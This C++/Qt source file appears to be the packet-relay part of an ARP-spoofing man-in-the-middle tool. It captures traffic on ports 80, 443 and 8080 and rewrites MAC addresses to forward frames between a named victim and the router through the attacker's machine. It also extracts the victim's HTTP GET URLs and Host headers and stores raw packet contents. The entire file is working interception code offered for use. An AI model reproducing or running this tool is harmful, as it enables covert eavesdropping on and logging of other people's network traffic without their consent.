#include "relay_spoof.h"
#include <QCoreApplication>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <libnet.h>

void get_mac_filter(char *get, u_char *my);
int flag_check_get(u_char *a, u_char *b);
//void get_print_packet(int len, u_char *packet);
void getUrl(u_char *packet, int len);
void sendUrl(u_char *packet, int len);

QStringList url_list, dataList[100];
int get_broad_cnt = 0, test_cnt = 0;

relay_spoof::relay_spoof(QObject *parent) : QThread(parent)
{

}

pcap_t *get_pcap;
u_char myMac_get[6], routerMac_get[6], victimMac_get[6];

void relay_spoof::run() {
    int cnt = 0, i = 0;
    bpf_u_int32 netp, maskp;
    struct bpf_program filter;
    char errbuf[PCAP_ERRBUF_SIZE];
    char *dev;
    struct pcap_pkthdr *pkthdr;
    u_char *packet;
    struct libnet_ethernet_hdr *eth;

    dev = pcap_lookupdev(errbuf);
    if(pcap_lookupnet(dev, &netp, &maskp, errbuf) == -1) exit(1);
    get_pcap = pcap_open_live(dev, 65535, 0, -1, errbuf);
    if(pcap_compile(get_pcap, &filter, "tcp port 80 or tcp port 443 or tcp port 8080", 0, maskp) == -1) exit(1);
    if(pcap_setfilter(get_pcap, &filter) == -1) exit(1);

    get_mac_filter(my_mac.toLatin1().data(), myMac_get);
    get_mac_filter(router_mac.toLatin1().data(), routerMac_get);
    get_mac_filter(victim_mac.toLatin1().data(), victimMac_get);

    get_stop = false;
    while(1) {
        while((cnt = pcap_next_ex(get_pcap, &pkthdr, (const u_char**)&packet)) > 0) {
            eth = (struct libnet_ethernet_hdr *)packet;

            if(flag_check_get(eth->ether_dhost, myMac_get) != 1 && flag_check_get(eth->ether_shost, routerMac_get) == 1 && flag_check_get(eth->ether_shost, victimMac_get) != 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet+i) = *(routerMac_get+i);
                    *(packet+ETHER_ADDR_LEN+i) = *(myMac_get+i);
                }
                pcap_sendpacket(get_pcap, packet, pkthdr->len);
//                printf("\n##### Host Get Packet #####\n");
//                get_print_packet(pkthdr->len, packet);
                getUrl(packet, pkthdr->len);
                if(get_broad_cnt != test_cnt) {
                    emit urlList(url_list);
                    test_cnt++;
                }
            }
            if(flag_check_get(eth->ether_dhost, myMac_get) != 1 && flag_check_get(eth->ether_shost, routerMac_get) != 1 && flag_check_get(eth->ether_shost, victimMac_get) == 1 && ntohs(eth->ether_type) == ETHERTYPE_IP) {
                for(i = 0; i < ETHER_ADDR_LEN; i++) {
                    *(packet+i) = *(victimMac_get+i);
                    *(packet+ETHER_ADDR_LEN+i) = *(myMac_get+i);
                }
                pcap_sendpacket(get_pcap, packet, pkthdr->len);
//                printf("\n##### DNS Packet #####\n");
//                get_print_packet(length, packet);
                sendUrl(packet, pkthdr->len);
            }
        }
        if(get_stop) break;
    }
    emit spoof_fin(true);
}

void get_mac_filter(char *get, u_char *my) {	// owner mac address save at my_mac variable
    int i, j = 0;
    for(i = 0; i < ETHER_ADDR_LEN; i++) {
        if(*(get+j) < 'a') {
            *(my+i) = (*(get+j) - '0') * 0x10;
            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
        }
        else {
            *(my+i) = (*(get+j) == 'a') ? 0xa0 : ((*(get+j) == 'b') ? 0xb0 : ((*(get+j) == 'c') ? 0xc0 : ((*(get+j) == 'd') ? 0xd0 : ((*(get+j) == 'e') ? 0xe0 : 0xf0))));
            if(*(get+j+1) < 'a') *(my+i) += (*(get+j+1) - '0') * 0x01;
            else *(my+i) += (*(get+j+1) == 'a') ? 0x0a : ((*(get+j+1) == 'b') ? 0x0b : ((*(get+j+1) == 'c') ? 0x0c : ((*(get+j+1) == 'd') ? 0x0d : ((*(get+j+1) == 'e') ? 0x0e : 0x0f))));
        }
        j += 2;
    }
}

int flag_check_get(u_char *a, u_char *b) {	// compare with mac address
    int value = 0;
    value = (*a != *b ? 1 : ((*(a+1) != *(b+1)) ? 1 : ((*(a+2) != *(b+2)) ? 1 : ((*(a+3) != *(b+3)) ? 1 : ((*(a+4) != *(b+4)) ? 1 : ((*(a+5) != *(b+5)) ? 1 : -1))))));
    return value;
}
/*
void get_print_packet(int len, u_char *packet) {
    int cnt = 0;
    printf("\n");
    while(len-- != 0) {
        printf("%02x ", *(packet++));
        if ((++cnt % 16) == 0) printf("\n");
    }
    printf("%02x\n", *packet);
}
*/
void getUrl(u_char *packet, int len) {
    int i = 0, tmp = 0, cnt = 0, get_len = len;
    bool var = false;
    u_char *text = packet;
    QString imsi, tempStr;
    text += 54;
    get_len -= 54;
    while(get_len > 0) {
        if(*(text+i) == 71 && *(text+i+1) == 69 && *(text+i+2) == 84)
            while(get_len > 0) {
                if(*(text+i) > 32 && *(text+i) < 127) {
                    tempStr.append(*(text+i));
                    tmp = 0;
                    var = true;
                }
                if(*(text+i) < 32 && var == true) tempStr.append('.');
                else if(*(text+i) == 32 && var == true) tempStr.append(' ');
                i++;
                get_len--;
            }
        i++;
        get_len--;
        if(var == true) break;
    }
    i = 0; tmp = 0;
    if(!tempStr.isEmpty()) {
        qDebug() << "#####getUrl : " << tempStr;
        while(true) {
            if(tempStr.at(i) == 'H' && tempStr.at(i+1) == 'o' && tempStr.at(i+2) == 's' && tempStr.at(i+3) == 't' && tempStr.at(i+4) == ':') {
                i += 6;
                imsi.append("http://");
                while(true) {
                    if((tempStr.at(i) == '.' && tempStr.at(i+1) == '.') || tempStr.length() == i) break;
                    imsi.append(tempStr.at(i++));
                }
                i -= (tmp + imsi.length() - 1);
                while(true) {
                    if(tempStr.at(i) == 'G' && tempStr.at(i+1) == 'E' && tempStr.at(i+2) == 'T') {
                        i += 4;
                        while(true) {
                            imsi.append(tempStr.at(i++));
                            if((tempStr.at(i) == 'H' && tempStr.at(i+1) == 'T' && tempStr.at(i+2) == 'T' && tempStr.at(i+3) == 'P' && tempStr.at(i+4) == '/') || tempStr.length() == i) break;
                        }
                    }
                    i++;
                    if(tempStr.length() == i) break;
                }
                if(!url_list.isEmpty()) for(tmp = 0; tmp < url_list.length(); tmp++) if(url_list.at(tmp) == imsi) cnt = 100;
                if(cnt != 100) {
                    get_broad_cnt++;
                    url_list.append(imsi);
                }
            }
            i++;
            if(tempStr.length() <=  i) break;
            else tmp = i;
        }
    }
}

void sendUrl(u_char *packet, int len) {
    int i = 0;
    QString tempStr;
    u_char *text = packet;
    for(i = 0; i < (len - 1); i++) tempStr.append(*(text+i));
    qDebug() << "sendUrl : " << tempStr;
    dataList[test_cnt].append(tempStr);
}

void relay_spoof::mac_get(QString v, QString m, QString r) {
    victim_mac = v;
    my_mac = m;
    router_mac = r;
}
